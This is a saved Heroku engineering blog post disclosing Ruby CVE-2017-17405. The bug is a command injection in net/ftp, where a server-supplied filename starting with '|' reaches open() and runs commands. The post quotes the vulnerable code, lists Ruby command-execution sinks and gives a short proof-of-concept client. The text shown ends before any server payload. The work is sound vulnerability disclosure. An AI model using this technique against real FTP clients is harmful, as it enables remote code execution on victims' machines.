<!DOCTYPE html>
<!-- saved from url=(0048)https://blog.heroku.com/identifying-ruby-ftp-cve -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
<script type="text/javascript" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/65f280cd1e"></script><script type="text/javascript" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/pd.js"></script><script src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/nr-1099.min.js"></script><script type="text/javascript" async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/i.js"></script><script type="text/javascript" async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/linkid.js"></script><script type="text/javascript" async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/f.txt"></script><script type="text/javascript" async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/8119.js"></script><script type="text/javascript" async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/analytics.js"></script><script async="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/gtm.js"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"65f280cd1e","applicationID":"102907313","transactionName":"IFcNEkZcXFxRER9IXBBMEElHW19H","queueTime":1,"applicationTime":256,"agent":""}</script>
<script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,n,t){function r(t){if(!n[t]){var o=n[t]={exports:{}};e[t][0].call(o.exports,function(n){var o=e[t][1][n];return r(o||n)},o,o.exports)}return n[t].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<t.length;o++)r(t[o]);return r}({1:[function(e,n,t){function r(){}function o(e,n,t){return function(){return i(e,[c.now()].concat(u(arguments)),n?null:this,t),n?void 0:this}}var i=e("handle"),a=e(3),u=e(4),f=e("ee").get("tracer"),c=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",l=d+"ixn-";a(p,function(e,n){s[n]=o(d+n,!0,"api")}),s.addPageAction=o(d+"addPageAction",!0),s.setCurrentRouteName=o(d+"routeName",!0),n.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,n){var t={},r=this,o="function"==typeof n;return i(l+"tracer",[c.now(),e,t],r),function(){if(f.emit((o?"":"no-")+"fn-start",[c.now(),r,o],t),o)try{return n.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],t),e}finally{f.emit("fn-end",[c.now()],t)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,n){m[n]=o(l+n)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,c.now()])}},{}],2:[function(e,n,t){function r(e,n){if(!o)return!1;if(e!==o)return!1;if(!n)return!0;if(!i)return!1;for(var t=i.split("."),r=n.split("."),a=0;a<r.length;a++)if(r[a]!==t[a])return!1;return!0}var o=null,i=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var u=navigator.userAgent,f=u.match(a);f&&u.indexOf("Chrome")===-1&&u.indexOf("Chromium")===-1&&(o="Safari",i=f[1])}n.exports={agent:o,version:i,match:r}},{}],3:[function(e,n,t){function r(e,n){var t=[],r="",i=0;for(r in e)o.call(e,r)&&(t[i]=n(r,e[r]),i+=1);return t}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],4:[function(e,n,t){function r(e,n,t){n||(n=0),"undefined"==typeof t&&(t=e?e.length:0);for(var r=-1,o=t-n||0,i=Array(o<0?0:o);++r<o;)i[r]=e[n+r];return i}n.exports=r},{}],5:[function(e,n,t){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,n,t){function r(){}function o(e){function n(e){return e&&e instanceof r?e:e?f(e,u,i):i()}function t(t,r,o,i){if(!d.aborted||i){e&&e(t,r,o);for(var a=n(o),u=v(t),f=u.length,c=0;c<f;c++)u[c].apply(a,r);var p=s[y[t]];return p&&p.push([b,t,r,a]),a}}function l(e,n){h[e]=v(e).concat(n)}function m(e,n){var t=h[e];if(t)for(var r=0;r<t.length;r++)t[r]===n&&t.splice(r,1)}function v(e){return h[e]||[]}function g(e){return p[e]=p[e]||o(t)}function w(e,n){c(e,function(e,t){n=n||"feature",y[t]=n,n in s||(s[n]=[])})}var h={},y={},b={on:l,addEventListener:l,removeEventListener:m,emit:t,get:g,listeners:v,context:n,buffer:w,abort:a,aborted:!1};return b}function i(){return new r}function a(){(s.api||s.feature)&&(d.aborted=!0,s=d.backlog={})}var u="nr@context",f=e("gos"),c=e(3),s={},p={},d=n.exports=o();d.backlog=s},{}],gos:[function(e,n,t){function r(e,n,t){if(o.call(e,n))return e[n];var r=t();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(e,n,t){function r(e,n,t,r){o.buffer([e],r),o.emit(e,n,t)}var o=e("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(e,n,t){function r(e){var n=typeof e;return!e||"object"!==n&&"function"!==n?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");n.exports=r},{}],loader:[function(e,n,t){function r(){if(!E++){var e=x.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&n))return s.abort();c(y,function(n,t){e[n]||(e[n]=t)}),f("mark",["onload",a()+x.offset],null,"api");var t=l.createElement("script");t.src="https://"+e.agent,n.parentNode.insertBefore(t,n)}}function o(){"complete"===l.readyState&&i()}function i(){f("mark",["domContent",a()+x.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(u=Math.max((new Date).getTime(),u))-x.offset}var u=(new Date).getTime(),f=e("handle"),c=e(3),s=e("ee"),p=e(2),d=window,l=d.document,m="addEventListener",v="attachEvent",g=d.XMLHttpRequest,w=g&&g.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:g,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var h=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1099.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),x=n.exports={offset:u,now:a,origin:h,features:{},xhrWrappable:b,userAgent:p};e(1),l[m]?(l[m]("DOMContentLoaded",i,!1),d[m]("load",r,!1)):(l[v]("onreadystatechange",o),d[v]("onload",r)),f("mark",["firstbyte",u],null,"api");var E=0,O=e(5)},{}]},{},["loader"]);</script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="V8eEvIkb6RQqJca9Wf-o9baurAQMe54VKxd06IeaFeg">
    <title>A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation | Heroku</title>
  <link rel="stylesheet" media="screen" href="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/application-fb9081a71c6047d54012e458164ecea02a66ffdc0be1286a4091456837182c9b.css">

  <script src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/application-2cf211f7acd0e7a4cee5b6293f895b7f4f118f4ebb531980d3ab98697e714920.js"></script>
  <link rel="shortcut icon" type="image/x-icon" href="https://www.herokucdn.com/favicon.ico">

  <link rel="alternate" type="application/rss+xml" title="Heroku Blog RSS Feed" href="https://blog.heroku.com/feed">

  <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://blog.heroku.com/images/apple-touch-icons/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://blog.heroku.com/images/apple-touch-icons/apple-touch-icon-152x152.png">

      <link rel="canonical" href="https://blog.heroku.com/identifying-ruby-ftp-cve">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@heroku">
  <meta name="twitter:title" content="A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation">
  <meta name="twitter:description" content="At Heroku we consistently monitor vulnerability feeds for new issues. Once something drops, we jump into action to triage and determine how our platform...">
  <meta name="twitter:image" content="https://www.herokucdn.com/images/og.png">
    <meta name="twitter:author" content="@_staaldraad">
  <meta property="og:url" content="https://blog.heroku.com/identifying-ruby-ftp-cve">
  <meta property="og:type" content="article">
  <meta property="og:title" content="A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation">
  <meta property="og:description" content="At Heroku we consistently monitor vulnerability feeds for new issues. Once something drops, we jump into action to triage and determine how our platform...">
  <meta property="og:image" content="https://www.herokucdn.com/images/og.png">


    <meta name="description" content="At Heroku we consistently monitor vulnerability feeds for new issues. Once something drops, we jump into action to triage and determine how our platform...">

    <meta name="slack-app-id" content="A1QME020P">
<script src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/f(1).txt"></script><script type="text/javascript" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/analytics"></script></head>
<body class="channel-engineering js-posts-show-identifying-ruby-ftp-cve" itemid="https://blog.heroku.com/" itemscope="" itemtype="https://schema.org/Blog">
  <div itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
  <div itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
    <meta itemprop="url" content="//blog-assets3.herokucdn.com/assets/logo-215x60-57a391f32dc2b78efdec7cfb047fdcf6bee42b7a03c8836a580036ec1800eacb.png">
    <meta itemprop="width" content="215">
    <meta itemprop="height" content="60">
  </div>
  <meta itemprop="name" content="Heroku">
</div>

  <div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
  <meta itemprop="url" content="https://www.herokucdn.com/images/og.png">
  <meta itemprop="width" content="1200">
  <meta itemprop="height" content="630">
</div>

  <!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-JD26"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-JD26');</script>
<!-- End Google Tag Manager -->


  <div id="heroku-cookie-banner"><div class="heroku-cookie-banner" aria-live="polite" role="status"><p>We use cookies to make interactions with our websites and services easy and meaningful, to better understand how they are used and to tailor advertising. You can <a href="https://www.salesforce.com/company/privacy/full_privacy.jsp#nav_info">read more</a> and <a href="https://www.salesforce.com/company/privacy/full_privacy.jsp#nav_info">make your cookie choices here</a>. By continuing to use this site you are giving us your consent to do this.</p> <a class="heroku-cookie-banner__dismiss" href="https://blog.heroku.com/identifying-ruby-ftp-cve#" onclick="Heroku.CookieBanner.dismiss(event)"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M6.663 8.01l-3.362 3.362a.955.955 0 0 0-.005 1.352.953.953 0 0 0 1.352-.005L8.01 9.357l3.362 3.362a.955.955 0 0 0 1.352.005.953.953 0 0 0-.005-1.352L9.357 8.01l3.362-3.362a.955.955 0 0 0 .005-1.352.953.953 0 0 0-1.352.005L8.01 6.663 4.648 3.301a.955.955 0 0 0-1.352-.005.953.953 0 0 0 .005 1.352L6.663 8.01z"></path></svg></a></div></div>

<header id="header">
  <nav id="navigation" role="navigation">
    <span class="mobile-nav" aria-hidden="true">
      Show nav
      <span></span>
      <span></span>
      <span></span>
      <span></span>
    </span>

    <div class="wrapper-full">
      <div id="logo">
        <a href="https://www.heroku.com/home">Heroku</a>
      </div>
      <div class="nav-wrapper">
        <ul class="main-nav">
          <li class="has-dropdown">
            <a href="https://www.heroku.com/products">Products</a>
            <ul class="dropdown">
              <li class="has-dropdown"><a class="bookends-icon platform" href="https://www.heroku.com/platform">Heroku Platform</a>
                <ul class="dropdown">
                  <li class="has-dropdown"><a class="bookends-icon dx" href="https://www.heroku.com/dx">Heroku DX</a>
                    <ul class="dropdown wide">
                      <li><a class="bookends-icon flow" href="https://www.heroku.com/flow">Heroku Flow</a></li>
                      <li><a class="bookends-icon cd" href="https://www.heroku.com/continuous-delivery">Continuous Delivery</a></li>
                      <li><a class="bookends-icon ci" href="https://www.heroku.com/continuous-integration">Continuous Integration</a></li>
                    </ul>
                  </li>
                  <li><a class="bookends-icon opex" href="https://www.heroku.com/platform/opex">Heroku OpEx</a></li>
                  <li class="has-dropdown"><a class="bookends-icon runtime" href="https://www.heroku.com/platform/runtime">Heroku Runtime</a>
                    <ul class="dropdown">
                      <li><a class="bookends-icon dyno" href="https://www.heroku.com/dynos">Heroku Dynos</a></li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li><a class="bookends-icon postgres" href="https://www.heroku.com/postgres">Heroku Postgres</a></li>
              <li><a class="bookends-icon redis" href="https://www.heroku.com/redis">Heroku Redis</a></li>
              <li><a class="bookends-icon kafka" href="https://www.heroku.com/kafka">Kafka on Heroku</a></li>
              <li class="has-dropdown">
                <a class="bookends-icon enterprise" href="https://www.heroku.com/enterprise">Heroku Enterprise</a>
                <ul class="dropdown wide">
                  <li><a class="bookends-icon spaces" href="https://www.heroku.com/private-spaces">Heroku Private Spaces</a></li>
                  <li><a class="bookends-icon connect" href="https://www.heroku.com/connect">Heroku Connect</a></li>
                  <li><a class="bookends-icon shield" href="https://www.heroku.com/shield">Heroku Shield</a></li>
                </ul>
              </li>
              <li><a class="bookends-icon teams" href="https://www.heroku.com/teams">Heroku Teams</a></li>
            </ul>
          </li>
          <li class="has-dropdown">
            <a href="https://elements.heroku.com/">Marketplace</a>
            <ul class="dropdown">
              <li><a class="bookends-icon addons" href="https://elements.heroku.com/addons">Add-ons</a></li>
              <li><a class="bookends-icon buttons" href="https://elements.heroku.com/buttons">Buttons</a></li>
              <li><a class="bookends-icon buildpacks" href="https://elements.heroku.com/buildpacks">Buildpacks</a></li>
              <li><a class="bookends-icon elements" href="https://www.heroku.com/elements">About</a></li>
            </ul>
          </li>
          <li><a id="pricing-head" href="https://www.heroku.com/pricing">Pricing</a></li>
          <li><a id="doc-head" href="https://devcenter.heroku.com/">Documentation</a></li>
          <li><a href="https://www.heroku.com/support">Support</a></li>
          <li class="has-dropdown">
            <a class="nav-more" href="https://blog.heroku.com/identifying-ruby-ftp-cve#">More</a>
            <div class="dropdown more">
              <section class="more-resources">
                <span class="more-title">Resources</span>
                <ul>
                  <li><a href="https://www.heroku.com/what">What is Heroku?</a></li>
                  <li><a href="https://www.heroku.com/help">Help</a></li>
                  <li><a href="https://www.heroku.com/customers">Customers</a></li>
                  <li><a href="https://www.heroku.com/careers">Careers</a></li>
                  <li><a href="https://www.heroku.com/events">Events</a></li>
                  <li><a href="https://www.heroku.com/podcasts">Podcasts</a></li>
                  <li><a href="https://www.heroku.com/compliance">Compliance Center</a></li>
                </ul>
              </section>
              <section class="more-heroku-is">
                <span class="more-title">Heroku is for</span>
                <ul>
                  <li><a href="https://www.heroku.com/developers">Developers</a></li>
                  <li><a href="https://www.heroku.com/ctos">CTOs</a></li>
                  <li><a href="https://www.heroku.com/team-collaboration">Team Collaboration</a></li>
                  <li><a href="https://www.heroku.com/startups">Startups</a></li>
                  <li><a href="https://www.heroku.com/enterprises">Enterprises</a></li>
                  <li><a href="https://www.heroku.com/agencies">Agencies</a></li>
                  <li><a href="https://www.heroku.com/students">Students</a></li>
                  <li><a href="https://www.heroku.com/solutions">See More</a></li>
                </ul>
              </section>
              <section class="more-languages">
                <span class="more-title">Languages</span>
                <ul>
                  <li><a href="https://www.heroku.com/nodejs">Node</a></li>
                  <li><a href="https://www.heroku.com/ruby">Ruby</a></li>
                  <li><a href="https://www.heroku.com/java">Java</a></li>
                  <li><a href="https://www.heroku.com/php">PHP</a></li>
                  <li><a href="https://www.heroku.com/python">Python</a></li>
                  <li><a href="https://www.heroku.com/go">Go</a></li>
                  <li><a href="https://www.heroku.com/scala">Scala</a></li>
                  <li><a href="https://www.heroku.com/clojure">Clojure</a></li>
                  <li><a href="https://www.heroku.com/languages">See More</a></li>
                </ul>
              </section>
              <section id="more-blog" class="more-blog">
                <span class="more-title">Latest News from the Heroku Blog</span>
                <h3><a class="js-blog-link" href="https://blog.heroku.com/sso-improvements"> Improving the SSO Experience: CLI Login and Certificate Management</a></h3>
                <p class="js-blog-date">4 days ago by Khushboo Goel</p>
                <p class="js-blog-content"><p>We are happy to announce two major improvements to our SSO experience for Heroku Enterprise customers: easier SSO login for users via the Heroku CLI, and the ability for admins to add more than... <a href="https://blog.heroku.com/sso-improvements">Read More</a></p></p>
                <a class="button btn btn-default btn-sm btn-inline" href="https://blog.heroku.com/news">More news</a>
                <a class="button btn-inline" href="https://blog.heroku.com/">View all blog posts</a>
              </section>
            </div>
          </li>
        </ul>

        <ul class="tool-nav">
            <li>
              <form action="https://blog.heroku.com/search" class="site-search" id="site-search" method="get">
                <div class="search-input gsc-input">
                  <input type="text" spellcheck="false" autocomplete="off" name="q" title="search">
                  <button type="submit" value="Submit search" class="search-submit">
                </button></div>
              </form>
            </li>

            <li class="user">
              <a href="https://id.heroku.com/">Log in</a>
              <span>or</span>
              <a class="sign-up highlight" data-trackable="{&quot;category&quot;:&quot;Sign Up Links&quot;,&quot;action&quot;:&quot;Clicked&quot;,&quot;label&quot;:&quot;www-header&quot;}" href="https://signup.heroku.com/">Sign up</a>
            </li>
        </ul>
      </div>

    </div>
  </nav>

      <div class="channel-bar">
    <nav id="channel" class="engineering">
      <h2 class="text-purple caps"><a href="https://blog.heroku.com/">Heroku Blog</a></h2>
      <ul class="subnav-inner">
        <li class="caps latest ">
          <a href="https://blog.heroku.com/">
            <i class="icon icon-channel-latest"></i>
            Latest
</a>        </li>
          <li class="caps news ">
            <a href="https://blog.heroku.com/news">
              <i class="icon icon-channel-news"></i>
              News
</a>          </li>
          <li class="caps engineering active">
            <a href="https://blog.heroku.com/engineering">
              <i class="icon icon-channel-engineering"></i>
              Engineering
</a>          </li>
          <li class="caps ecosystem ">
            <a href="https://blog.heroku.com/ecosystem">
              <i class="icon icon-channel-ecosystem"></i>
              Ecosystem
</a>          </li>
      </ul>
    </nav>
  </div>


</header>



  <div class="main">

      <section class="breadcrumbs">
        <div class="wrapper">
            <nav>
    <ul>
      <li>
        <a href="https://blog.heroku.com/">Blog</a>
        /
      </li>
      <li>
        <a href="https://blog.heroku.com/engineering">Engineering</a>
        /
      </li>
      <li>A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation</li>
    </ul>
  </nav>

        </div>
      </section>

    <div class="content">

      




  <article itemid="https://blog.heroku.com/identifying-ruby-ftp-cve" itemscope="" itemtype="https://schema.org/BlogPosting" class="post story">
    <div itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
  <div itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
    <meta itemprop="url" content="//blog-assets3.herokucdn.com/assets/logo-215x60-57a391f32dc2b78efdec7cfb047fdcf6bee42b7a03c8836a580036ec1800eacb.png">
    <meta itemprop="width" content="215">
    <meta itemprop="height" content="60">
  </div>
  <meta itemprop="name" content="Heroku">
</div>

    <div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
  <meta itemprop="url" content="https://www.herokucdn.com/images/og.png">
  <meta itemprop="width" content="1200">
  <meta itemprop="height" content="630">
</div>

    <meta itemprop="mainEntityOfPage" content="https://blog.heroku.com/identifying-ruby-ftp-cve">

    <div class="header-group text-center">
      <h1 itemprop="name headline">A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation</h1>
    </div>

    <div class="post-meta">
      <div class="post-meta-content">
        <meta itemprop="dateModified" content="2018-04-09T17:17:55Z">
          <time class="caps" itemprop="datePublished" datetime="2018-04-06T16:27:00Z">April 06, 2018</time>
        <a href="https://blog.heroku.com/authors/etienne-stalmans">
          <img width="100" height="100" alt="Etienne Stalmans" class="avatar" data-hires="https://gravatar.com/avatar/3776ed0d8600065f0f66e89c3b811a16?d=https%3A%2F%2Fblog-assets3.herokucdn.com%2Fassets%2Favatar-default-guest-ed7ff852c822436eccaf1dee3f291243975027aaf2752dcff8fbedd428ee5b9f.png&amp;s=200" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/3776ed0d8600065f0f66e89c3b811a16.jpeg">
</a>        <span class="author caps">
          Posted by <a href="https://blog.heroku.com/authors/etienne-stalmans">Etienne Stalmans</a>
        </span>
      </div>
      <hr>
    </div>


    <section class="post-body js-post-body" itemprop="articleBody">
      <p>At Heroku we consistently monitor vulnerability feeds for new issues. Once a new vulnerability drops, we jump into action to triage and determine how our platform and customers may be affected. Part of this process involves evaluating possible attack scenarios not included in the original vulnerability report. We also spend time looking for "adjacent" and similar bugs in other products. The following Ruby vulnerability was identified during this process.</p>
<h2 class="anchored">
  <a name="vulnerability-triage" href="https://blog.heroku.com/identifying-ruby-ftp-cve#vulnerability-triage">Vulnerability Triage</a>
</h2>

<p>A vulnerability, <a href="https://curl.haxx.se/docs/adv_2017-ae72.html">CVE-2017-8817</a>, was identified in <code>libcurl</code>. The FTP function contained an out of bounds read when processing wildcards. As soon as the vulnerability was made public, we went through our various systems to determine how they are affected and to initiate the patching process. Direct <code>libcurl</code> usage inside Heroku´s systems were identified and marked for patching. Once we were confident that all instances were flagged, we started looking into other libraries that might have a similar issue. On a hunch, and because a large number of our customers make use of Ruby, we decided to look at Ruby's FTP implementation. Our approach was twofold, first to determine if Ruby uses <code>libcurl</code> for its FTP functions, and if so, could this vulnerability be triggered in a Ruby application. And second, to determine if Ruby had a custom FTP implementation, whether this also allowed FTP wildcards and, if so, if vulnerabilities also existed in this implementation.</p>

<p>To do our investigation we downloaded the latest source code for Ruby, at the time version 2.4.2, and did a quick <code>grep</code> for any mention of FTP.</p>

<pre><code>$ grep -i ftp -R *

ChangeLog:net/ftp: add a new option ssl_handshake_timeout to Net::FTP.new.
ChangeLog:net/ftp: close the socket directly when an error occurs during TLS handshake.
ChangeLog:Otherwise, @sock.read in Net::FTP#close hungs until read_timeout exceeded.
ChangeLog:net/ftp: close the connection if the TLS handshake timeout is exceeded.
</code></pre>

<p>It turns out Ruby has its own FTP library and this is packaged as <em>net/ftp</em>. We started looking into the <em>lib/net</em> folder, half expecting a custom C implementation of FTP. Turns out there is a solitary <em>ftp.rb</em> file, and it only weighed in at 1496 lines of code.</p>
<h2 class="anchored">
  <a name="the-vulnerability" href="https://blog.heroku.com/identifying-ruby-ftp-cve#the-vulnerability">The Vulnerability</a>
</h2>

<p>While reading through the code in <em>ftp.rb</em> there were a few of the usual suspects to look out for:</p>

<ul>
<li><code>command</code></li>
<li><code>%x/command/</code></li>
<li><code>IO.popen(command)</code></li>
<li><code>Kernel.exec</code></li>
<li><code>Kernel.system</code></li>
<li><code>Kernel.open("| command")</code> and <code>open("| command")</code></li>
</ul>

<p>All of the above functions are common vectors to gain <a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Command_Injection">Remote Code Execution (RCE)</a> in Ruby applications, and are thus one of the first things to look for during code analysis. It didn't take long to identify a few locations where the <code>open</code> function was being used to access files for reading and writing.</p>

<p>Looking at the <code>gettextfile</code> function, we could see a call to <code>open</code> using what appeared to be user controlled data:</p>

<pre class=" language-ruby"><code class=" language-ruby"><span class="token number">778</span>     <span class="token comment">#</span>
<span class="token number">779</span>     <span class="token comment"># Retrieves +remotefile+ in ASCII (text) mode, storing the result in</span>
<span class="token number">780</span>     <span class="token comment"># +localfile+.</span>
<span class="token number">781</span>     <span class="token comment"># If +localfile+ is nil, returns retrieved data.</span>
<span class="token number">782</span>     <span class="token comment"># If a block is supplied, it is passed the retrieved data one</span>
<span class="token number">783</span>     <span class="token comment"># line at a time.</span>
<span class="token number">784</span>     <span class="token comment">#</span>
<span class="token number">785</span>     <span class="token keyword">def</span> <span class="token function">gettextfile</span><span class="token punctuation">(</span>remotefile<span class="token punctuation">,</span> localfile <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span>remotefile<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">786</span>                     <span class="token operator">&amp;</span>block<span class="token punctuation">)</span> <span class="token comment"># :yield: line</span>
<span class="token number">787</span>       f <span class="token operator">=</span> <span class="token keyword">nil</span>
<span class="token number">788</span>       result <span class="token operator">=</span> <span class="token keyword">nil</span>
<span class="token number">789</span>       <span class="token keyword">if</span> localfile
<span class="token number">790</span>         f <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>localfile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
<span class="token number">791</span>       <span class="token keyword">elsif</span> <span class="token operator">!</span>block_given<span class="token operator">?</span>
<span class="token number">792</span>         result <span class="token operator">=</span> <span class="token builtin">String</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token class-name">793</span>       <span class="token keyword">end</span>
<span class="token number">794</span>       <span class="token keyword">begin</span>
<span class="token number">795</span>         <span class="token function">retrlines</span><span class="token punctuation">(</span><span class="token string">"RETR <span class="token interpolation"><span class="token delimiter tag">#{</span>remotefile<span class="token delimiter tag">}</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>line<span class="token punctuation">,</span> newline<span class="token operator">|</span>
<span class="token number">796</span>           l <span class="token operator">=</span> newline <span class="token operator">?</span> line <span class="token operator">+</span> <span class="token string">"\n"</span> <span class="token punctuation">:</span> line
<span class="token number">797</span>           f<span class="token operator">&amp;</span><span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
<span class="token number">798</span>           block<span class="token operator">&amp;</span><span class="token punctuation">.</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> newline<span class="token punctuation">)</span>
<span class="token number">799</span>           result<span class="token operator">&amp;</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
<span class="token number">800</span>         <span class="token keyword">end</span>
<span class="token number">801</span>         <span class="token keyword">return</span> result
<span class="token number">802</span>       <span class="token keyword">ensure</span>
<span class="token number">803</span>         f<span class="token operator">&amp;</span><span class="token punctuation">.</span>close
<span class="token number">804</span>       <span class="token keyword">end</span>
<span class="token number">805</span>     <span class="token keyword">end</span>
</code></pre>

<p>The <code>localfile</code> value would trigger command execution if the value was <code>| os command</code>. In general use, most users would likely provide their own <code>localfile</code> value and would not rely on the default of <code>File.basename(remotefile)</code> however, in some situations, such as listing and downloading all files in a FTP share, the <code>remotefile</code> value would be controlled by the remote host and could thus be manipulated into causing RCE. Since the file path is simply a string returned by the server (either <code>ls -l</code> style for the <code>LIST</code> command, or filenames for <code>NLIST</code>), there is no guarantee that filename will be a valid filename.</p>
<h2 class="anchored">
  <a name="poc" href="https://blog.heroku.com/identifying-ruby-ftp-cve#poc">PoC</a>
</h2>

<p>We wrote a basic Ruby client that we could use to test the vulnerability. This client simply connects to a server, requests a list of files, and then tries to download all the files.</p>

<pre class=" language-ruby"><code class=" language-ruby"><span class="token keyword">require</span> <span class="token string">'net/ftp'</span>
host <span class="token operator">=</span> <span class="token string">'172.17.0.4'</span>
port <span class="token operator">=</span> <span class="token number">2121</span>

<span class="token constant">Net</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FTP</span><span class="token punctuation">.</span><span class="token function">const_set</span><span class="token punctuation">(</span><span class="token string">'FTP_PORT'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span>
<span class="token constant">Net</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FTP</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>ftp<span class="token operator">|</span>
 ftp<span class="token punctuation">.</span>login
 fileList <span class="token operator">=</span> ftp<span class="token punctuation">.</span><span class="token function">nlst</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span>
 fileList<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>file<span class="token operator">|</span>
       ftp<span class="token punctuation">.</span><span class="token function">gettextfile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>
 <span class="token keyword">end</span>
<span class="token keyword">end</span>
</code></pre>

<p>Our server would need to respond to the <code>NLIST</code> command with a filename containing our command to executed. Since no validation or sanitization is done on the supplied filename, it would simply be passed straight to the <code>open</code> function and our command would execute. The only caveat being that our <em>"filename"</em> needs to start with <code>|</code>.</p>

